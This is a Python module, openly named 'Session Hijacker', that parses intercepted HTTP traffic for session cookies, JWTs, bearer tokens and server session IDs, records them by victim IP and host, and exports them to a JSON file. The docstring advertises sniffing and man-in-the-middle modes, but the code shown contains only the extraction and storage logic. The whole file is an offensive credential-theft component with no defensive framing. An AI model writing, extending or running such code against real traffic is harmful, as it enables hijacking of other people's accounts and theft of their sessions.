"""
Session Hijacker
================
HTTP session hijacking via cookie and token extraction from
intercepted traffic. Supports passive sniffing and active
man-in-the-middle modes.
"""

import re
import json
import time
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, asdict
from urllib.parse import urlparse


@dataclass
class SessionCredential:
    """Extracted session credential record."""
    host: str
    cookie: str
    token: Optional[str]
    user_agent: Optional[str]
    timestamp: float
    source_ip: str
    protocol: str


class SessionHijacker:
    """HTTP session hijacking and credential extraction engine."""

    COOKIE_PATTERNS = [
        re.compile(r"session[_-]?id[=:]([^;\s]+)", re.I),
        re.compile(r"auth[_-]?token[=:]([^;\s]+)", re.I),
        re.compile(r"jwt[=:]([^;\s]+)", re.I),
        re.compile(r"Bearer\s+([A-Za-z0-9-_=]+)", re.I),
        re.compile(r"PHPSESSID[=:]([^;\s]+)", re.I),
        re.compile(r"ASPSESSIONID[=:]([^;\s]+)", re.I),
        re.compile(r"JSESSIONID[=:]([^;\s]+)", re.I),
    ]

    def __init__(self, iface: str):
        self.iface = iface
        self.sessions: Dict[str, SessionCredential] = {}
        self._running = False
        self.stats = {"packets_analyzed": 0, "sessions_captured": 0}

    def analyze_packet(self, packet_data: bytes,
                       src_ip: str = "unknown") -> Optional[SessionCredential]:
        """
        Analyze a raw packet for session credentials.

        Args:
            packet_data: Raw packet payload (HTTP headers/body)
            src_ip: Source IP address of the packet

        Returns:
            SessionCredential if credentials found, else None
        """
        self.stats["packets_analyzed"] += 1
        text = packet_data.decode("utf-8", errors="ignore")

        # Extract Host header
        host_match = re.search(r"Host:\s*([^\r\n]+)", text, re.I)
        host = host_match.group(1).strip() if host_match else "unknown"

        # Extract User-Agent
        ua_match = re.search(r"User-Agent:\s*([^\r\n]+)", text, re.I)
        user_agent = ua_match.group(1).strip() if ua_match else None

        # Search for cookies
        cookie_match = re.search(r"Cookie:\s*([^\r\n]+)", text, re.I)
        cookie = cookie_match.group(1).strip() if cookie_match else ""

        # Search for session tokens in cookies and headers
        token = None
        for pattern in self.COOKIE_PATTERNS:
            match = pattern.search(text)
            if match:
                token = match.group(1)
                break

        if not cookie and not token:
            return None

        cred = SessionCredential(
            host=host,
            cookie=cookie,
            token=token,
            user_agent=user_agent,
            timestamp=time.time(),
            source_ip=src_ip,
            protocol="https" if "443" in text else "http",
        )

        key = f"{src_ip}:{host}"
        self.sessions[key] = cred
        self.stats["sessions_captured"] += 1
        return cred

    def get_sessions(self, host_filter: Optional[str] = None) -> List[Dict[str, Any]]:
        """
        Get captured sessions, optionally filtered by host.

        Args:
            host_filter: Filter by hostname substring

        Returns:
            List of session credential dictionaries
        """
        results = []
        for cred in self.sessions.values():
            if host_filter and host_filter.lower() not in cred.host.lower():
                continue
            results.append(asdict(cred))
        return results

    def export_sessions(self, filepath: str) -> bool:
        """Export captured sessions to JSON file."""
        try:
            with open(filepath, "w") as f:
                json.dump(self.get_sessions(), f, indent=2)
            return True
        except Exception as e:
            print(f"[Session] Export error: {e}")
            return False

    def clear(self) -> None:
        """Clear all captured sessions."""
        self.sessions.clear()
        self.stats["sessions_captured"] = 0

    def get_stats(self) -> Dict[str, int]:
        """Return hijacking statistics."""
        return {**self.stats, "active_sessions": len(self.sessions)}
